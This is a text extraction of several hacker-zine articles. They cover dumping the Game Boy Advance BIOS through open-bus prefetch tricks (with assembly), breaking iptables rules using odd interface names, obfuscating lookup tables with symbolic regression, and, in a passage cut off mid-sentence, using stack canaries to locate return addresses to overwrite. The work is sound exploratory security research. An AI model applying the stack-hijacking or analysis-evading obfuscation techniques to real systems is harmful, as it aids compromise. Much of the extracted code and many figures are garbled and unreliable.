black-box version of the attack that does not require
knowledge of the address by deriving what it is at
runtime by clever use of interrupts.
But this article is about neither of the above.
This is a different method that does not utilize any
software vulnerabilities in the BIOS; in fact, it re-
quires neither knowledge of the contents of the BIOS
nor execution of any BIOS code.
BIOS Protection
The BIOS ROM is a piece of read-only memory that
sits at the beginning of the GBA’s address space. In
addition to being used for initialization, it also pro-
vides a handful of routines accessable by software
interrupts. It is rather small, sitting at 16 KiB in
size. Games running on the GBA are prevented from
reading the BIOS and only code running from the
BIOS itself can read the BIOS. Attempts to read the
BIOS from elsewhere results in only the last success-
fully fetched BIOS opcode, so the BIOS from the
game’s point of view is just a repeating stream of
garbage.
This naturally leads to the question: How does
the BIOS ROM actually protect itself from improper
access? The GBA has no memory management unit;
data and prefetch aborts are not a thing that hap-
pens. Looking at how emulators implement this
22 http://problemkaputt.de/gbatek.htm
23 https://mgba.io/2017/06/30/cracking-gba-bios/
392
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
38
40
42
44
46
48
50
52
54
+−−−−−−−−−−−−−−−−−+
00000000 h |
|
| BIOS ROM ( 1 6 KiB ) |
00003FFFh |
|
+−−−−−−−−−−−−−−−−−+
00004000 h | Unmapped memory |
|
|
01FFFFFFh |
|
+−−−−−−−−−−−−−−−−−+
02000000 h |EWRAM ( 2 5 6 KiB )
|
| On−board work RAM|
02FFFFFFh | M i r r o r e d
|
+−−−−−−−−−−−−−−−−−+
03000000 h |IWRAM ( 3 2 KiB )
|
| On−c h i p Work RAM |
03FFFFFFh | M i r r o r e d
|
+−−−−−−−−−−−−−−−−−+
04000000 h |MMIO
|
|
|
040003FFh |
|
+−−−−−−−−−−−−−−−−−+
04000400 h | Mostly ∗
|
| Unmapped Memory |
04FFFFFFh |
|
+−−−−−−−−−−−−−−−−−+
05000000 h | P a l e t t e RAM
|
| ( 1 KiB )
|
05FFFFFFh | M i r r o r e d
|
+−−−−−−−−−−−−−−−−−+
06000000 h | Video RAM
|
| ( 9 6 KiB )
|
06FFFFFFh | M i r r o r e d ∗∗
|
+−−−−−−−−−−−−−−−−−+
07000000 h | O b j e c t A t t r i b u t e |
| Memory (OAM)
|
| ( 1 KiB )
|
07FFFFFFh | M i r r o r e d
|
+−−−−−−−−−−−−−−−−−+
08000000 h | Game Pak ROM
|
|
|
| Three m i r r o r s
|
| with d i f f e r e n t
|
| wait s t a t e s
|
0DFFFFFFh |
|
+−−−−−−−−−−−−−−−−−+
0 E000000h | Game Pak SRAM
|
| ( Variable s i z e )
|
| Mirrored
|
0FFFFFFFh |
|
+−−−−−−−−−−−−−−−−−+
10000000 h | Unmapped memory |
|
|
|
|
FFFFFFFFh |
|
+−−−−−−−−−−−−−−−−−+
\
|
> Yes , we ’ r e i n t e r e s t e d i n t h i s p a r t
|
/
∗ : The I /O p o r t 04000800 h a l o n e i s m i r r o r e d
t h r o u g h t h i s r e g i o n , r e p e a t i n g e v e r y 64KiB .
( 0 4 xx0800h i s a m i r r o r o f 04000800 h . )
∗ ∗ : Although VRAM i s 96KiB = 64KiB + 32KiB ,
i t i s m i r r o r e d a c r o s s memory i n b l o c k s o f
128KiB = 64 Kib + 32 Kib + 32 Kib
The two 32 KiB b l o c k s a r e m i r r o r s o f
each o t h e r .
}
A l s o t h i s p a r t , but s p o i l e r s .
56
58
60
GBA Memory Map : Most memory r e g i o n s a r e m i r r o r e d t h r o u g h each
r e s p e c t i v e memory r e g i o n , with t h e e x c e p t i o n o f
t h e BIOS ROM and MMIO Gaps i n t h e memory map
a r e found a f t e r t h e BIOS ROM, MMIO, and a t t h e
end o f t h e a d d r e s s s p a c e
62
64
Diagram based on i n f o r m a t i o n from Martin Korth
h t t p : / / p r o b l e m k a p u t t . de / g b a t e k . htm
40does not help as most emulators look at the CPU’s
program counter to determine if the current instruc-
tion is within or outside of the BIOS memory re-
gion and use this to allow or disallow access respec-
tively, but this can’t possibly be how the real BIOS
ROM actually determines a valid access as wiring up
the PC to the BIOS ROM chip would’ve been pro-
hibitively complex. Thus a simpler technique must
have been used.
A normal ARM7TDMI chip exposes a number
of signals to the memory system in order to access
memory. A full list of them are available in the
ARM7TDMI reference manual (page 3-3), but the
ones that interest us at the moment are nOPC and
A[31:0]. A[31:0] is a 32-bit value representing the
address that the CPU wants to read. nOPC is a sig-
nal that is 0 if the CPU is reading an instruction,
and is 1 if the CPU is reading data. From this, a
very simple scheme for protecting the BIOS ROM
could be devised: if nOPC is 0 and A[31:0] is within
the BIOS memory region, unlock the BIOS. other-
wise, if nOPC is 0 and A[31:0] is outside of the BIOS
memory region, lock the BIOS. nOPC of 1 has no ef-
fect on the current lock state. This serves to protect
the BIOS because the CPU only emits a nOPC=0 sig-
nal with A[31:0] being an address within the BIOS
only it is intending to execute instructions within
the BIOS. Thus only BIOS instructions have access
to the BIOS.
While the above is a guess of how the GBA ac-
tually does BIOS locking, it matches the observed
behaviour.
This answers our question on how the BIOS pro-
tects itself. But it leads to another: Are there any
edge-cases due to this behaviour that allow us to
easily dump the BIOS? It turns out the answer to
this question is yes.
A[31:0] falls within the BIOS when the CPU
intends to execute code within the BIOS. This does
not necessarily mean the code is actually has to be
executed, but there only has to be an intent by
the CPU to execute. The ARM7TDMI CPU is a
pipelined processor. In order to keep the pipeline
filled, the CPU accesses memory by prefetching two
instructions ahead of the instruction it is currently
executing. This results in an off-by-two error: While
BIOS sits at 0x00000000 to 0x00003FFF, instruc-
tions from two instruction widths ahread of this have
access to the BIOS! This corresponds to 0xFFFFFFF8
to 0x00003FF7 when in ARM mode, and 0xFFFF-
24 Does
FFFC to 0x00003FFB when in Thumb mode.
Evidently this means that if you could place in-
structions at memory locations just before the ROM
you would have access to the BIOS with protection
disabled. Unfortunately there is no RAM backing
these memory locations (see GBA Memory Map).
This complicates this attack somewhat, and we need
to now talk about what happens with the CPU reads
unmapped memory.
Executing from Unmapped Memory
When the CPU reads unmapped memory, the value
it actually reads is the residual data remaining on
the bus left after the previous read, that is to say
it is an open-bus read. 24 This makes it simple to
make it look like instructions exist at an unmapped
memory location: all we need to do is somehow get
it on the bus by ensuring it is the last thing to be
read from or written to the bus. Since the instruc-
tion prefetcher is often the last thing to read from
the bus, the value you read from the bus is often the
last prefetched instruction.
One thing to note is that since the bus is 32 bits
wide, we can either stuff one ARM instruction (1×32
bits) or two Thumb instructions (2×16 bits). Since
the first instruction of BIOS is going to be the reset
vector at 0x00000000, we have to do a memory read
followed by a return. Thus two Thumb instructions
it is.
Where we jump from is also important. Each
memory chip puts slightly different things on the
bus when a 16-bit read is requested. A table of what
each memory instruction places on the bus is shown
in Figure 1.
this reliance on the parasitic capacitance of the bus make this more of a hardware attack? Who can say.
412
V a l u e s i n Memory :
| $−2 | $−1 | $
| $+1 | $+2 | $+3 |
| 0 x88 | 0 x99 | 0xAA | 0xBB | 0xCC | 0xDD |
4
6
8
10
12
14
Data found on bus
| Memory Region |
| −−−
|
| EWRAM
|
| IWRAM
|
|
|
| P a l e t t e RAM
|
| VRAM
|
| OAM
|
|
|
| Game Pak ROM |
a f t e r CPU r e q u e s t s
Alignment
−−−
doesn ’ t mat ter
$ % 4 == 0
$ % 4 == 2
doesn ’ t ma tte r
doesn ’ t m att er
$ % 4 == 0
$ % 4 == 2
doesn ’ t m att er
16− b i t r e a d o f a d d r e s s $ .
| Value on bus
|
| −−−
|
| 0xBBAABBAA
|
| 0x ? ? ? ?BBAA ( ∗ ) |
| 0xBBAA? ? ? ? ( ∗ ) |
| 0xBBAABBAA
|
| 0xBBAABBAA
|
| 0xDDCCBBAA
|
| 0xBBAA9988
|
| 0xBBAABBAA
|
16
18
( ∗ ) IWRAM i s r a t h e r p e c u l i a r . The RAM c h i p w r i t e s t o o n l y h a l f o f
t h e bus . This means t h a t h a l f o f t h e p e n u l t i m a t e v a l u e on t h e bus
i s s t i l l v i s i b l e , h e r e r e p r e s e n t e d by ? ? ? ? .
Figure 1. Data on the Bus
Since we want two different instructions to ex-
ecute, not two of the same, the above table imme-
diately eliminates all options other than OAM and
IWRAM. Of the two available options, I chose to
use IWRAM. This is because OAM is accessed by
the video hardware and thus is only available to the
CPU during VBlank and optionally HBlank – this
would unnecessarily complicate things.
All we need to do now is ensure that the penul-
timate memory access puts one Thumb instruction
on the bus and that the prefetcher puts the other
Thumb instruction on the bus, then immediately
jump to the unmapped memory location 0xFFFF-
FFFC. Which instruction is placed by what depends
on instruction alignment. I’ve arbitrarily decided to
put the final jump on a non-4-byte aligned address,
so the first instruction is placed on the bus via a STR
instruction and the latter is place four bytes after
our jump instruction so that the prefetcher reads it.
Note that the location to which the STR takes place
does not matter at all, 25 all we’re interested in is
what happens to the bus.
By now you ought to see how the attack can
be assembled from the ability to execute data left
on the bus at any unmapped address, the ability to
place two 16-bit Thumb instructions in a single 32-
bit bus word, and carefully navigating the pipeline
to branch to avoid unmapped instruction and to un-
lock the BIOS ROM.
25 Well,
if you trash an MMIO register that’s your fault really.
42Exploit Summary
Reading the locked BIOS ROM is performed by five
steps, which together allow us to fetch one 32-bit
word from the BIOS ROM.
1. We put two instructions onto the bus ldr
r0, [r0]; bx lr (0x47706800). As we are start-
ing from IWRAM, we use a store instruction as well
as the prefetcher to do this.
2. We jump to the invalid memory address
0xFFFFFFFC in Thumb mode. 26 The CPU attempts
to read instructions from this address and instead
reads the instructions we’ve put on bus.
3. Before executing the instruction at 0xFFFF-
FFFC, the CPU prefetches two instructions ahead.
This results in a instruction read of 0x00000000
(0xFFFFFFFC + 2 * 2). This unlocks the BIOS.
4. Our ldr r0, [r0] instruction at 0xFFFFFFFC
executes, reading the unlocked memory.
5. Our bx lr instruction at 0xFFFFFFFE exe-
cutes, returning to our code.
Where to store the dumped BIOS is left as an
exercise for the reader. One can choose to print the
BIOS to the screen and painstakingly retype it in,
byte by byte. An alternative and possibly more con-
venient method of storing the now-dumped BIOS -
should one have a flashcart — could be storing it to
Game Pak SRAM for later retrieval. One may also
choose to write to another device over SIO, 27 which
requires a receiver program (appropriately named
recver) to be run on an attached computer. 28 As an
added bonus this technique does not require a flash-
cart as one can load the program using the GBA’s
multiboot protocol over the same cable.
–——–
———
—–—–
This exploit’s performance could be improved, as
ldr r0, [r0] is not the most efficient instruction
that can fit. ldm would retrieve more values per call.
Could this technique apply to the ROM from
other systems, or perhaps there is some other way
to abuse our two primitives: that of data remaining
on the bus for unmapped addresses and that of the
unexecuted instruction fetch unlocking the ROM?
Assembly
1 . thumb
. s e c t i o n . iwram
3 . f u n c read_bios , r e a d _ b i o s
. g l o b a l read_bios
5 . t y p e read_bios , %f u n c t i o n
. balign 4
7 // u32 r e a d _ b i o s ( u32 b i o s _ a d d r e s s ) :
read_bios :
9
l d r r1 , =0xFFFFFFFD
l d r r2 , =0x47706800
11
s t r r2 , [ r 1 ]
bx r 1
13
bx l r
bx l r
15 . b a l i g n 4
. endfunc
17 . l t o r g
Acknowledgments
Thanks to Martin Korth whose documentation of
the GBA proved invaluable to its understanding.
Thanks also to Vicki Pfau and to Byuu for their
GBA emulators which I often reference.
26 This appears in the assembly as a branch to 0xFFFFFFFD because the least significant bit of the program counter controls
the mode. All Thumb instructions are odd, and all ARM instructions are even.
27 unzip pocorgtfo16.pdf iodump.zip
28 git clone https://github.com/MerryMage/gba-multiboot
4344
read_bios+8
0xFFFFFFFD
read_bios+10
0xFFFFFFFC
0xFFFFFFFE
Counts,16:08
Naming Network Interfaces
by Cornelius Diekmann
There are only two hard things in Computer Sci-
ence: misogyny and naming things. Sometimes they
are related, though this article only digresses about
the latter, namely the names of the beloved network
interfaces on our Linux machines. Some neighbors
stick to the boring default names, such as lo, eth0,
wlan0, or ens1. But what names does the mighty
kernel allow for interfaces? The Linux kernel spec-
ifies that any byte sequence which is not too long,
has neither whitespace nor colons, can be pointed
to by a char*, and does not cause problems when
interpreted as filename, is okay. 29
The church of weird machines praises this nice
and clean recognition routine. The kernel is not
even bothering its deferential user with character
encoding; interface names are just plain bytes.
# ip link
$ ( echo
$ i p addr
4 6 c 6 f 6 c01
2
Hitting enter, my machine is suddenly alone in
the void, not even talking to my neighbors over the
happy red snowman interface.
1 # i p t a b l e s −s a v e
∗ filter
3 : INPUT ACCEPT [ 0 : 0 ]
:FORWARD ACCEPT [ 0 : 0 ]
5 :OUTPUT ACCEPT [ 0 : 0 ]
−A INPUT −j DROP
7 −A INPUT − i
−j ACCEPT
COMMIT
Where did the match “-i +” in the first rule go?
Why is it dropping all traffic, not just the traffic
from the evil Internet?
The answer lies, as envisioned by the prophecy
of LangSec, in a mutual misunderstanding of what
an interface name is. This misunderstanding is be-
tween the Linux kernel and netfilter/iptables. ipta-
bles has almost the same understanding as the ker-
nel, except that a “+” at the end of an interface’s
byte sequence is interpreted as a wildcard. Hence,
iptables and the Linux kernel have the same under-
standing about “ ”, “eth0”, and “eth+++0”, but not
about “eth+”. Ultimately, iptables interprets “+” as
“any interface.” Thus, having realized that iptables
match expressions are merely Boolean predicates in
conjunctive normal form, we found universal truth
in “-i +”. Since tautological subexpressions can be
eliminated, “-i +” disappears.
But how can we match on our interface “+” with
a vanilla iptables binary? With only the minor in-
convenience of around 250 additional rules, we can
match on all interfaces which are not named “+”.
s e t e t h 0 name \
−ne ’ l o l \ x01 \ x02 \ x03 \ x04 \ x 0 5 y o l o ’ )
| xxd
0203 0405 79 6 f 6 c 6 f
l o l . . . . . yolo
For convenience, our time-honoured terminals
interpret byte sequences according to our local en-
coding, also featuring terminal escapes.
2
# i p l i n k s e t e t h 0 name \
$ ( echo −ne ’ \ e [ 3 1m \ e [ 0m ’ )
Given a contemporary color display, the user can
enjoy a happy red snowman.
For the uplink to the Internet (with capital I), I
like to call my interface “+”.
# i p l i n k s e t e t h 1 name +
Having decided on fine interface names, we ob-
viously need to protect ourselves from the evil
haxXx0rs in the Internet. Yet, our happy red snow-
man looks innocent and we are sure that no evil will
ever come from that interface.
1 # i p t a b l e s −I INPUT − i + −j DROP
# i p t a b l e s −A INPUT \
3
− i $ ( echo −ne ’ \ e [ 3 1m \ e [ 0m ’ ) −j ACCEPT
29 See
#! / b i n / bash
2 i p t a b l e s −N PLUS
i p t a b l e s −A INPUT −j PLUS
4 f o r i i n $ ( s e q 1 2 5 5 ) ; do
B=$ ( echo −ne " \ x$ ( p r i n t f ’%02x ’ $ i ) " )
6
i f [ "$B" != ’+ ’ ] && [ "$B" != ’ ’ ] \
&& [ "$B" != " " ] ; then
8
i p t a b l e s −A PLUS − i "$B+" −j RETURN
fi
10 done
i p t a b l e s −A PLUS −m comment \
12
−−comment ’ o n l y + r e m a i n s ’ −j DROP
i p t a b l e s −A INPUT \
14
− i $ ( echo −ne ’ \ e [ 3 1m \ e [ 0m ’ ) −j ACCEPT
Figure 3.
451 /∗ dev_valid_name − c h e c k i f name i s okay f o r n e t w o r k d e v i c e
∗ @name : name s t r i n g
3 ∗
∗ Network d e v i c e names need t o be v a l i d f i l e names t o a l l o w s y s f s t o work .
5 ∗ d i s a l l o w any k i n d o f w h i t e s p a c e .
∗/
7 b o o l dev_valid_name ( const char ∗name ) {
i f ( ∗ name == ’ \0 ’ )
9
return f a l s e ;
i f ( s t r l e n ( name ) >= IFNAMSIZ)
11
return f a l s e ;
i f ( ! strcmp ( name , " . " ) | | ! strcmp ( name , " . . " ) )
13
return f a l s e ;
15
17
19
while ( ∗ name ) {
i f ( ∗ name == ’ / ’ | | ∗name == ’ : ’ | |
return f a l s e ;
name++;
}
return t r u e ;
We a l s o
i s s p a c e ( ∗ name ) )
21 }
EXPORT_SYMBOL( dev_valid_name ) ;
Figure 3. net/core/dev.c from Linux 4.4.0.
As it turns out, iptables 1.6.0 accepts certain
chars in interfaces the kernel would reject, in par-
ticular tabs, dots, colons, and slashes.
With great interface names comes great respon-
sibility, in particular when viewing iptables-save.
Our esteemed paranoid readers likely never print
any output on their terminals directly, but always
pipe it through cat -v to correctly display non-
printable characters. But can we do any better?
Can we make the firewall faster and the output of
iptables-save safe for our terminals?
−−− i p t a b l e s − 1 . 6 . 0 _orig / l i b x t a b l e s / x t a b l e s . c
2 +++ i p t a b l e s − 1 . 6 . 0 / l i b x t a b l e s / x t a b l e s . c
@@ −532 ,10 +532 ,7 @@
4
s t r c p y ( vianame , a r g ) ;
i f ( v i a l e n == 0 )
6
return ;
− e l s e i f ( vianame [ v i a l e n − 1 ] == ’+ ’ ) {
8 −
memset ( mask , 0xFF , v i a l e n − 1 ) ;
−
/∗ Don ’ t remove ‘+ ’ h e r e ! − HW ∗/
10 − } e l s e {
+ else {
12
/∗ I n c l u d e nul−t e r m i n a t o r i n match ∗/
memset ( mask , 0xFF , v i a l e n + 1 ) ;
14
f o r ( i = 0 ; vianame [ i ] ; i ++) {
The rash reader might be inclined to opine that
the heretic folks at netfilter worship the golden
calf of the almighty “+” character deep within their
hearts and code. But do not fall for this fallacy any
further! Since the code is the window to the soul,
we shall see that the fine folks at netfilter are pure
in heart. The overpowering semantics of “+” exist
just in userspace; the kernel is untainted and pure.
Since all bytes in a char[] are created equal, I shall
venture to banish this unholy special treatment of
“+” from my userland.
With the equality of chars restored, we can fi-
nally drop those packets.
# i p t a b l e s −A INPUT − i + −j DROP
Happy naming and many pleasant encounters
with all the naı̈ve programs on your machine not
anticipating your fine interface names.
4616:09
Code Golf and Obfuscation
with Genetic Algorithm Based Symbolic Regression
by JBS
√
A ÷ B, A × B, sin(A), cos(A), exp(A), A, and A B ,
where C is an arbitrary constant function, A and B
can either be terminal or non-terminal nodes in the
expression, and all functions are real valued.
Any reasonably complex piece of code is bound
to have at least one lookup table (LUT) contain-
ing integer or string constants. In fact, the entire
data section of an executable can be thought of as
a giant lookup table indexed by address. If we had
some way of obfuscating the lookup table address-
ing, it would be sure to frustrate reverse engineers
who rely on juicy strings and static analysis.
For example, consider this C function.
Briefly, the search for a best fit regression model
becomes a genetic algorithm optimization problem:
(1) the correlation of an initial model is evaluated,
(2) the parse tree of the model is formed, (3) the
model is then mutated with random functions in ac-
cordance with an entropy parameter, (4) these mod-
els are then evaluated, (5) crossover rules are used
among the top performing models to form the next
generation of models.
char magic(int i) {
return (89 ^ (((859 - (i | -53)) | ((334 + i) | (i /
(i & -677)))) & (i - ((i * -50) | i | -47))))
+ ((-3837 << ((i | -2) ^ i)) >> 28) / ((-6925 ^
((35 << i) >> i)) >> (30 * (-7478 ^ ((i << i) >>
19))));
}
What happens when we use such a regression
scheme to learn a function that maps one integer
to another, Z → Z? An expression, possibly more
compact than a LUT, can be arrived at that bears
no resemblance to the underlying data. Since no
attempt is made to perform regularization, given a
deep enough search, we can arrive at an expression
which exactly fits a LUT!
–——–
———
—–—–
Pretty opaque, right? But look what happens when
we iterate over the function.
int main(int argc, char** argv) {
for(int i=10; i<=90; i+=10) {
printf("%c", magic(i));
}
}
Lo and behold, it prints “PoCkGTFO”! Now, imag-
ine if we could automatically generate a similarly
opaque, magical function to replicate any string,
lookup table, or integer mapping we wanted. Neigh-
bors, read on to find out how.
Regression is a fundamental tool for establishing
functional relationships between variables in data
and makes whole fields of empirically-driven science
possible. Traditionally, a target model is selected
a priori (e.g., linear, power-law, polynomial, Gaus-
sian, or rational), the fit is performed by an appro-
priate linear or nonlinear method, and then its over-
all performance is evaluated by a measure of how
well it represents the underlying data (e.g., Pearson
correlation coefficient).
Symbolic regression 30 is an alternative to this in
which—instead of the search space simply being co-
efficients to a preselected function—a search is done
on the space of possible functions. In this regime,
instead of the user selecting model to fit, the user
specifies the set of functions to search over. For ex-
ample, someone who is interested in an inherently
cyclical phenomenon might select C, A + B, A − B,
Please rise and open your hymnals to 13:06, in
which Evan Sultanik created a closet drama about
phone keypad mappings.
1 2
abc 3
def
4
ghi 5
jkl 6
mno
7
pqrs 8
tuv 9
wxyz
0
He used genetic algorithms to generate a new map-
ping that utilizes the 0 and 1 buttons to minimize
the potential for collisions in encoded six-digit En-
glish words. Please be seated.
30 Michael Schmidt and Hod Lipson. Distilling free-form natural laws from experimental data. Science, 324(5923):81–85,
2009.
47What if we want to encode a keypad mapping in
an obfuscated way? Let’s represent each digit ac-
cording to its ASCII value and encode its keypad
mapping as the value of its button times ten plus its
position on the button.
Character
‘a’
‘b’
‘c’
‘d’
‘e’
‘f’
‘g’
‘h’
‘i’
‘j’
‘k’
‘l’
‘m’
‘n’
‘o’
‘p’
‘q’
‘r’
‘s’
‘t’
‘u’
‘v’
‘w’
‘x’
‘y’
‘z’
Decimal ASCII
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
make code shorter or needlessly complicated, de-
pending on how the optimization is done and which
final algebraic simplifications are applied.
While there are readily available codes to do
symbolic regression, including commercial codes like
Eureqa, they only perform floating point evaluation
with floating point values. To remedy this tragic de-
ficiency, we modified an open source symbolic regres-
sion package written by Yurii Lahodiuk. 31 The eval-
uation of the existing functions were converted to
integer arithmetic; additional functions were added;
print statements were reformatted to make them
valid C; the probability of generating a non-terminal
state was increased to perform deeper searches; and
search resets were added once the algorithm per-
formed 100 iterations with no improvement of the
convergence. This modified code is available in the
feelies. 32
The result is that we can encode the phone key-
pad mapping in the following relatively succinct—
albeit deeply unintuitive—integer function.
Keypad Encoding
21
22
23
31
32
33
41
42
43
51
52
53
61
62
63
71
72
73
74
81
82
83
91
92
93
94
int64_t encode(int64_t i) {
return ((((-7|2*i)^(i-61))/-48)^(((345/i)<<321)+
(-265%i)))+((3+i/-516)^(i+(-448/(i-62))));
}
So, all we need to do is find a function encode
such that for each decimal ASCII value i and its
associated keypad encoding k : encode(i) 7→ k. Us-
ing a commercial-off-the-shelf solver called Eureqa
Desktop, we can find a floating point function that
exactly matches the mapping with a correlation co-
efficient of R = 1.0.
This function encodes the LUT using only integer
constants and the integer functions ∗, /, <<, +, −,
|, ⊕, and %. It should also be noted that this code
uses the left bit-shift operator well past the bit size
of the datatype. Since this is an undefined behav-
ior and system dependent on the integer ALU’s im-
plementation, the code works with no optimization,
but produces incorrect results when compiled with
gcc and -O3; the large constant becomes 31 when
one inspects the resulting assembly code. There-
fore, the solution is not only customized for a given
data set; it is customized for the CPU and compiler
optimization level.
While this method presents a novel way of ob-
fuscating codes, it is a cautionary tale on how sus-
ceptible this method is to over-fitting in the absence
of regularization and model validation. Penalizing
overly complicated models, as the Eureqa solver did,
is no substitute. Don’t rely exclusively on symbolic
regression for finding general models of physical phe-
nomenon, especially from a limited number of obser-
vations!
int encode(int i) {
return 0.020866*i*i+9*fmod(fmod(121.113,i),0.7617)-
162.5-1.965e-9*i*i*i*i*i;
}
So, for any lower-case character c, encode(c) ÷ 10 is
the button number containing c, and encode(c) % 10
is its position on the button.
In the remainder of this article, we propose se-
lecting the following integer operations for fitting
discrete integer functions C, A + B, A − B, −A,
A ÷ B, A × B, A^B, A&B, A|B, A << B, A >> B,
A%B, and (A > B)?A : B, where the standard C99
definitions of those operators are used. With the
ability to create functions that fit integers to other
integers using integer operations, expressions can be
found that replace LUTs. This can either serve to
31 git
clone https://github.com/lagodiuk/genetic-programming
pocorgtfo16.pdf SymbolicRegression/*
32 unzip
4816:10
Locating Return Addresses via High Entropy Stack Canaries
by Matt Davis
Introduction
beacon for locating stack data, importantly return
addresses. Before the technique is discussed, the
idea of stacks living in dynamically allocated mem-
ory space must be visited.
POSIX threads and split-stack runtimes (think
Go-lang) allocate threads and their corresponding
stack regions dynamically, as a blob of memory
marked as read/write. To understand why this is,
one must first realize that threads are created at
runtime, and thus it is undecidable for a compiler
to know the number of threads a program might re-
quire.
Split-stacks are dynamically allocated thread-
stacks. A split-stack is like a traditional POSIX
thread stack, but instead of being a predetermined
size, the stack is allowed to grow dynamically at
runtime. Upon function entry, the thread will first
determine if it has enough stack space to contain the
stack contents of the to-be-executed function (pro-
logue check). If the thread’s stack space is not large
enough, then a new stack is allocated, the function
parameters are copied to the newly allocated space,
and then the stack pointer register is updated to
point to this new stack. These dynamically allo-
cated stacks can still utilize the security implied by
a stack canary. To illustrate the advantage of a split-
stack, the default POSIX thread size on my box (cre-
ated whenever a program calls ‘pthread_create’) is
hard-coded to 8MB. If for some reason a thread re-
quires more than 8MB, the program can crash. As
you can see, 8MB is a rather gross guess, and not
quite scalable. With GCC’s -fsplit-stack flag,
threads can be created tiny and grow as necessary.
All this is to say that stack frames can live in
a process’ memory space. As I will demonstrate,
locating stack data in this memory space can be
simple. If a return address can be found, then it
can be compromised. The memory mapped regions
of thread memory are fairly easy to find, looking
at ‘/proc/<pid>/maps’ one can find the correspond
memory maps. Those memory addresses can then
be used to read or write to the actual memory lo-
cated at ‘/proc/<pid>/mem’. Let’s take a look at
what happens after calling ‘pthread_create’ once
and dumping the maps table, as shown in Figure 4.
This figure highlights the regions of memory that
were allocated for the threads, not all of this might
be memory just for the thread. Note that the
The following article describes a technique that can
be used to identify a function return address within
an opaque memory space. Stack canaries of max-
imum entropy can be used to locate stack infor-
mation, thus repurposing a security mechanism as
a tool for learning about the memory space. Of
course, once a return address is located, it can be
overwritten to allow for the execution of malicious
code. This return address identification technique
can be used to compromise the stack environment
in a multi-threaded Linux environment. While the
operating system and compiler are mere specifici-
ties, the logic discussed here can be considered for
other executing environments. This all assumes that
a process is allowed to inspect the memory of either
itself or of another process.
Canaries and Stacks
Stack canaries are a mechanism for detecting a cor-
rupted stack, specifically malware that relies on
stack overflows to exploit a function’s return ad-
dress. Much like the oxygen-breathing avian in a
coalmine, which acts as a primitive toxic-gas detec-
tor, the analogous stack canary is a digital species
that will be destroyed upon stack corruption/com-
promise. Thus, a canary is a known value that is
placed onto the stack prior to function execution.
Upon function exit, that value is validated to en-
sure that it was not overwritten or corrupted during
the execution of the function. If the canary is not
the original value, then the validation routine can
prematurely terminate the application, to protect
the system from executing potential malware or op-
erating on corrupted data.
As it turns out, for security purposes, it is ideal
to have a canary that cannot be predicted before-
hand. If such were not the case, then a crafty
malware author could take control of the stack and
patch the expected value over-top of where the ca-
nary lives. One solution to avoid this compromise is
for the underlying system’s random number genera-
tor (/dev/urandom) to be used for generating canary
values. That is arguably a better solution to using
hard-coded canaries; however, one can compromise
a stack by using a randomly generated canary as a
491 00400000 −00401000
00600000 −00601000
3 00601000 −00602000
022 c7000 −022 e8000
5 7 f b d c 8 0 0 0 0 0 0 −7f b d c 8 0 2 1 0 0 0
7 f b d c 8 0 2 1 0 0 0 −7f b d c c 0 0 0 0 0 0
7 7 fbdcd18b000 −7f b d c d 1 8 c 0 0 0
7 f b d c d 1 8 c 0 0 0 −7f b d c d 9 8 c 0 0 0
9 7 f b d c d 9 8 c 0 0 0 −7f b d c d b2 7 0 0 0
[ . . . I g n o r i n g a few e n t r i e s . . .
11 f f f f f f f f f f 6 0 0 0 0 0 − f f f f f f f f f f 6 0 1 0 0 0
r−xp
r−−p
rw−p
rw−p
rw−p
−−−p
−−−p
rw−p
r−xp
00000000
00000000
00001000
00000000
00000000
00000000
00000000
00000000
00000000
08:01
08:01
08:01
00:00
00:00
00:00
00:00
00:00
08:01
5505848
5505848
5505848
0
0
0
0
0
7080135
/home/ u s e r / a . out
/home/ u s e r / a . out
/home/ u s e r / a . out
[ heap ]
<−− Thread memory .
<−− Guard memory .
<−− Guard memory .
<−− Thread memory .
/ usr / l i b / l i b c − 2.25. so
]
r−xp 00000000 0 0 : 0 0 0
[ vsyscall ]
Figure 4. Memory Map
pages marked without read and write permissions
are guard pages. In the case of a read/write op-
eration leaking onto those safety pages, a memory
violation will occur and the process will be termi-
nated.
This section started with an introduction with
what a canary is, but what do they look like? The
next two code dumps present a boring function and
the corresponding assembly. This code was com-
piled using GCC’s -fstack-protector-all flag.
The all variant of this flag forces GCC to always
generate a canary, even if the compiler can deter-
mine that one is not required.
The instruction ‘movq %fs:40, %rax’ loads the
canary value from the thread’s thread local storage.
This value is established at program load thanks to
the libssp library (bundled with GCC). That value is
then immediately pushed to the stack, 8 bytes from
the stack’s base pointer. The same compiler code
that generated this stack push should also have gen-
erated the validation portion in the function’s epi-
logue. Indeed, towards the end of the function there
is a check of the stack value against the thread local
storage value: ‘xorq %fs:40, %rdx.’ If the values
do not match, ‘__stack_chk_fail’ is called to pre-
maturely terminate the process.
1 // Boring f u n c t i o n . . .
i n t f o o ( void ) {
3
return 0 x d e a d b e e f ;
}
5
# I n asm with −f s t a c k −p r o t e c t o r − a l l
7 # p a s s e d a t c o m p i l e time .
foo :
9
pushq %rbp
movq
%rsp , %rbp
11
subq
%16 , %r s p
movq
%f s : 4 0 , %r a x
13
movq
%rax , −8(%rbp )
xorl
%eax , %eax
15
movl
$ 0 x d e a d b e e f , %eax
movq
−8(%rbp ) , %rdx
17
xorq
%f s : 4 0 , %rdx
je
. L3
19
call
__stack_chk_fail
. L3 :
21
leave
ret
50Making use of Maximum Entropy to
Identify a Stack
Afterward
As an aside, I scanned all of the processes on my
Arch Linux box to get an idea of how common a
maximum entropy word is. This is far from any kind
of scientific or statistically significant result, but it
provides an idea on the frequency of maximum en-
tropy (bytes not bits). After scanning 784,700,416
words, I found that 4,337,624 words had a different
value for each byte in the word. That is about 0.55%
of the words being maximum entropy.
Bottom of Stack
caller’s stack frame
parameters to callee
rbp +8
0
rbp −8
return address to caller
previous stack pointer (rbp)
stack canary
Now that we have gently strolled down thread-stack
and canary alley, we now arrive at the intersection
of pwnage. The question I am trying to answer here
is: How can an malicious attacker locate a stack
within a process’ memory space and compromise a
return address? I showed earlier what the /proc
entry looks like, which can be trivial to locate by
parsing the maps entries within the /proc file sys-
tem. But how can one locate a stack within that
potentially enormous memory space?
If your executable is at all security minded, it
will probably be compiled with stack canaries. In
fact, certain distributions alias GCC to use the
-fstack-protector option. (See the man page of
GCC for variations on that flag.) That is what we
need, a canary that we can easily spot in a mem-
ory space. Since the canaries from GCC seem to
be placed at a constant address from the stack base
pointer, it also happens to be a constant address
from the return address. The following is a stack
